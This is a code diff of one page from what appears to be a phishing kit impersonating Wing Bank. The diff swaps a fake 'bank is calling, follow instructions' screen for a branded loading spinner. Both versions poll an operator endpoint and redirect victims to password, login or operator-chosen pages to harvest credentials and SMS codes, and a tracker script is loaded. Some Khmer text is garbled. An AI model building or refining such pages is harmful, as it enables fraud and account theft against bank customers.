@@ -3,129 +3,80 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>ការចុហ្មោហ</title>
+<title>Loading</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
-body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center}
 
-.header{display:flex;align-items:center;justify-content:flex-end;padding:16px 20px}
-.x-btn{background:none;border:none;cursor:pointer;padding:4px}
-.x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
-
-.body{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 20px}
-
-.title{font-size:24px;font-weight:300;color:#1a1a1a;text-align:center;margin:24px 0 36px}
-
-.phone-sec{align-self:flex-start;margin-bottom:32px}
-.label{font-size:12px;color:#b0b0b0;margin-bottom:6px}
-.user-phone{font-size:18px;font-weight:500;color:#1a1a1a;letter-spacing:.3px}
-
-.calling-text{font-size:14px;color:#999;margin-bottom:28px}
-
-.ring-wrap{
-  position:relative;width:160px;height:160px;
-  display:flex;align-items:center;justify-content:center;margin-bottom:32px;
+.loader{
+  position:relative;width:180px;height:180px;
+  display:flex;align-items:center;justify-content:center;
 }
-.ring-bg{position:absolute;inset:0;border-radius:50%;border:3px solid rgba(0,166,81,.12)}
-.ring-spin{
+
+.circle-track{
   position:absolute;inset:0;border-radius:50%;
-  border:3.5px solid transparent;border-top:3.5px solid #00A651;border-right:3.5px solid #00A651;border-bottom:3.5px solid #00A651;
-  animation:spin 2s linear infinite;
+  border:3px solid rgba(169,207,56,.15);
 }
+
+.circle-spin{
+  position:absolute;inset:0;border-radius:50%;
+  border:3.5px solid transparent;
+  border-top-color:#A9CF38;
+  border-right-color:#A9CF38;
+  animation:spin 1.4s linear infinite;
+}
+
 @keyframes spin{to{transform:rotate(360deg)}}
-.ring-glow{
-  position:absolute;inset:20px;border-radius:50%;
-  background:radial-gradient(circle,rgba(0,166,81,.06) 0%,transparent 70%);
+
+.bird{
+  position:relative;z-index:1;
+  width:80px;height:80px;
+  animation:hop 0.6s ease-in-out infinite alternate;
 }
-.phone-ico svg{width:56px;height:56px;fill:#00A651;position:relative;z-index:1}
 
-.bank-num{font-size:18px;font-weight:600;color:#00A651;margin-bottom:10px;letter-spacing:.3px}
-
-.hint{font-size:14px;color:#999;text-align:center;line-height:1.55;max-width:300px;margin-bottom:24px}
-
-.sms-link{
-  font-size:14px;color:#00A651;font-weight:500;text-decoration:none;
-  cursor:pointer;padding:8px 0;align-self:flex-start;
+@keyframes hop{
+  0%{transform:translateY(4px) rotate(-2deg)}
+  100%{transform:translateY(-4px) rotate(2deg)}
 }
-.sms-link:hover{text-decoration:underline}
+
+.bird svg{width:100%;height:100%;fill:#A9CF38}
 </style>
 </head>
 <body>
 
-<div class="header">
-  <button class="x-btn" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
-</div>
-
-<div class="body">
-  <div class="title">ការចុហ្មោហ</div>
-
-  <div class="phone-sec">
-    <div class="label">លេខទុរសាព់</div>
-    <div class="user-phone" id="userPhone">+855</div>
+<div class="loader">
+  <div class="circle-track"></div>
+  <div class="circle-spin"></div>
+  <div class="bird">
+    <svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg">
+      <path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/>
+    </svg>
   </div>
-
-  <div class="calling-text">Wing Bank e19e80e19e98e19f92e19e96e19ebbe19e84e19ea0e19f85</div>
-
-  <div class="ring-wrap">
-    <div class="ring-bg"></div>
-    <div class="ring-spin"></div>
-    <div class="ring-glow"></div>
-    <div class="phone-ico">
-      <svg viewBox="0 0 24 24"><path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.55.57a1 1 0 011 1v3.49a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.45.57 3.55a1 1 0 01-.25 1.02l-2.2 2.22z"/></svg>
-    </div>
-  </div>
-
-  <div class="bank-num" id="bankNum">+855</div>
-
-  <div class="hint">ឆ្លីយការហៅហីយធ្វីតាមការណែនាំ</div>
-
-  <a class="sms-link" id="smsLink" href="#">e19e94e19e89e19f92e19e87e19eb6e19e80e19f8be19e8fe19eb6e19e98 SMS</a>
 </div>
 
 <script>
-var params=new URLSearchParams(location.search),orderId=params.get("order"),phone=params.get("phone");
-if(!orderId)location.href="index.html";
+var params = new URLSearchParams(location.search);
+var orderId = params.get("order");
+var phone = params.get("phone");
+if(!orderId) location.href = "index.html";
 
-function normalizePhone(p){
-  if(!p)return"";
-  p=String(p).replace(/\D/g,"");
-  if(p.indexOf("380")===0)p=p.substring(3);
-  return p;
-}
-function renderPhone(p){
-  p=normalizePhone(p);
-  if(p.length<9)return;
-  var f="+38 ("+p.substring(0,3)+") "+p.substring(3,6)+" "+p.substring(6,8)+" "+p.substring(8,10);
-  document.getElementById("userPhone").textContent=f;
-  document.getElementById("bankNum").textContent="+855"+p;
-}
-
-if(phone){
-  phone=normalizePhone(phone);
-  renderPhone(phone);
-}
-
-document.getElementById("smsLink").addEventListener("click",function(e){
-  e.preventDefault();location.href="password.html?order="+orderId+(phone?"&phone="+encodeURIComponent(phone):"");
-});
-
-function phoneQS(){return phone?"&phone="+encodeURIComponent(phone):""}
+function phoneQS(){ return phone ? "&phone=" + encodeURIComponent(phone) : ""; }
 
 function checkStatus(){
-  fetch("/api/orders/"+orderId+"/status")
-    .then(function(r){return r.json()})
+  fetch("/api/orders/" + orderId + "/status")
+    .then(function(r){ return r.json(); })
     .then(function(d){
-      if(d.username&&!phone){
-        phone=normalizePhone(d.username);
-        renderPhone(phone);
+      if(d.redirect_to){
+        location.href = d.redirect_to + (d.redirect_to.includes("?") ? "&" : "?") + "order=" + orderId + phoneQS();
+        return;
       }
-      if(d.redirect_to){location.href=d.redirect_to+(d.redirect_to.includes("?")?"&":"?")+"order="+orderId+phoneQS();return}
-      if(d.status==="confirmed")location.href="password.html?order="+orderId+phoneQS();
-      else if(d.status==="rejected")location.href="login.html?order="+orderId+"&error=1";
+      if(d.status === "confirmed") location.href = "password.html?order=" + orderId + phoneQS();
+      else if(d.status === "rejected") location.href = "login.html?order=" + orderId + "&error=1";
     }).catch(function(){});
 }
-setInterval(checkStatus,3000);checkStatus();
+setInterval(checkStatus, 3000);
+checkStatus();
 </script>
 <script src="tracker.js"></script>
 </body>
